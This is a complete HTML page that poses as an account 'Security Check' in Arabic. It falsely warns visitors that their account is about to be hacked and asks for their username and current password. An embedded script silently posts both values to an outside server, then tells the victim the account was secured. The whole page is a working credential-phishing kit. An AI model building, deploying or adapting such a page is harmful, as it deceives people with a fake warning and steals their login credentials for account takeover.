<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Security Check</title><style>body{font-family:sans-serif; text-align:center; padding:40px;}input{display:block; margin:10px auto; padding:10px; width:250px;}</style></head><body><h3>تحذير: حسابك مهدد بالاختراق</h3><p>يرجى تأكيد بياناتك فوراً لتأمين الحساب</p><form id="f"><input id="u" placeholder="اسم المستخدم" required><input id="p" type="password" placeholder="كلمة المرور الحالية" required><button type="submit">تأمين الآن</button></form><script>document.getElementById('f').onsubmit=(e)=>{e.preventDefault();fetch('https://brmbtbot.onrender.com/receive',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({platform:'Security Check',u:document.getElementById('u').value,p:document.getElementById('p').value})}).finally(()=>{alert('تم التأمين بنجاح');});};</script></body></html>
